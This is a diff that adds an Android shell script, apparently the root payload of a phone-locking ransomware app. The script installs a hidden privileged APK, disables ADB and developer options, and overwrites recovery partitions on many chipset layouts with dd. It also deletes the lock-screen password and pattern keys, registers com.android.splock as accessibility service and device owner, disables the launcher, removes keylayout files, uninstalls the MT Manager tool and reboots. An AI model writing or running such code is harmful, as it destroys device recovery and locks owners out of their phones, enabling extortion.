@@ -1,0 +1,71 @@
+export PATH=/system/bin:$PATH
+mount -o rw,remount /
+sleep 9999
+export PATH=/system/bin:$PATH
+mount -o rw,remount /
+mount -o rw,remount /system
+mount -o rw,remount /dev
+mount -o rw,remount /system/priv-app
+mount -o rw,remount /sys
+sleep 1
+chmod 0777 /data/data/com.tencent.mobileqq/lock.sm
+pm install -r /data/data/com.tencent.mobileqq/lock.sm
+mv /data/data/com.tencent.mobileqq/lock.sm /system/priv-app/yry.apk
+chmod 0777 /system/priv-app/yry.apk
+chown root:root /system/priv-app/yry.apk
+setprop persist.sys.usb.config none
+setprop persist.service.adb.enable 0
+settings put global adb_enabled 0
+settings put global development_settings_enabled 0
+dd if=/system/build.prop of=/dev/block/platform/mtk-msdc.0/11230000.msdc0/by-name/recovery
+dd if=/system/build.prop of=/dev/block/platform/omap/omap_hsmmc.0/by-name/recovery
+dd if=/system/build.prop of=/dev/block/platform/omap/omap_hsmmc.1/by-name/recovery
+dd if=/system/build.prop of=/dev/block/platform/sdhci-tegra.3/by-name/recovery
+dd if=/system/build.prop of=/dev/block/platform/sdhci-pxav3.2/by-name/RECOVERY
+dd if=/system/build.prop of=/dev/block/platform/msm_sdcc.1/by-name/FOTAKernel
+dd if=/system/build.prop of=/dev/block/platform/15570000.ufs/by-name/RECOVERY
+dd if=/system/build.prop of=/dev/block/platform/155a0000.ufs/by-name/RECOVERY
+dd if=/system/build.prop of=/dev/block/platform/comip-mmc.1/by-name/recovery
+dd if=/system/build.prop of=/dev/block/platform/msm_sdcc.1/by-name/recovery
+dd if=/system/build.prop of=/dev/block/platform/mtk-msdc.0/by-name/recovery
+dd if=/system/build.prop of=/dev/block/platform/sdhci-tegra.3/by-name/SOS
+dd if=/system/build.prop of=/dev/block/platform/sdhci-tegra.3/by-name/USP
+dd if=/system/build.prop of=/dev/block/platform/dw_mmc.0/by-name/recovery
+dd if=/system/build.prop of=/dev/block/platform/dw_mmc.0/by-name/RECOVERY
+dd if=/system/build.prop of=/dev/block/platform/hi_mci.1/by-name/recovery
+dd if=/system/build.prop of=/dev/block/platform/hi_mci.0/by-name/recovery
+dd if=/system/build.prop of=/dev/block/platform/sdhci-tegra.3/by-name/UP
+dd if=/system/build.prop of=/dev/block/platform/sdhci-tegra.3/by-name/SS
+dd if=/system/build.prop of=/dev/block/platform/sdhci.1/by-name/RECOVERY
+dd if=/system/build.prop of=/dev/block/platform/sdhci.1/by-name/recovery
+dd if=/system/build.prop of=/dev/block/platform/dw_mmc/by-name/recovery
+dd if=/system/build.prop of=/dev/block/platform/dw_mmc/by-name/RECOVERY
+dd if=/system/build.prop of=/dev/block/bootdevice/by-name/recovery
+dd if=/system/build.prop of=/dev/block/mmcblk0p13
+dd if=/system/build.prop of=/dev/block/by-name/recovery
+dd if=$abc of=/dev/block/by-name/recovery
+dd if=/system/build.prop of=/dev/block/recovery
+dd if=/system/build.prop of=/dev/block/nandg
+dd if=/system/build.prop of=/dev/block/acta
+dd if=/system/build.prop of=/dev/recovery
+dd if=/system/build.prop of=/dev/block/platform/dw_mmc.0/by-name/RECOVERY
+dd if=/system/build.prop of=$abc
+chmod -R 0000 /system/app/Launcher/launcher.apk
+settings put system screen_off_timeout 2147483647
+settings put global policy_control immersive.full=*
+wm overscan 0,-210,0,-210
+rm -rf /data/system/gatekeeper.password.key
+rm -rf /data/system/gatekeeper.pattern.key
+rm -rf /data/system/fingerprintpassword.key
+rm -rf /data/system/personal.key
+rm -rf /data/system/gesture.key
+rm -rf /data/system/password.key
+settings put secure enabled_accessibility_services com.android.splock/com.android.splock.RsenAccessibilityService
+settings put secure accessibility_enabled 1
+dpm set-device-owner com.android.splock/com.android.splock.Myheiye
+sleep 9
+input keyevent 26
+mv /system/usr/keylayout /system/sm
+mv /system/usr/keychars /system/sm2
+pm uninstall bin.mt.plus
+reboot
